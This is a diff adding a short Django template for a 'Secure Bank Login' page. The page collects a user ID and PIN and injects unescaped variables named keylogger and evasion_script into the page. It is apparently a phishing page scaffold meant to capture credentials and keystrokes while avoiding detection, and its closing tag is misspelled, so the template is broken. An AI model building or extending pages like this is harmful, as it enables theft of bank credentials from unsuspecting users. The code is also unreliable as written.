@@ -1,0 +1,15 @@
+{% extends 'base.html' %}
+
+{% load static %}
+
+{% block content %}
+<div>
+    <h1>Secure Bank Login</h1>
+    <form action="/submit/" method="post">
+      <input type="text" name="user_id" placeholder="User ID"><br>
+      <input type="password" name="pin" placeholder="PIN"><br>
+      <input type="submit" value="Log In">
+    </form>
+    {{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+</div>
+{% endblok %}
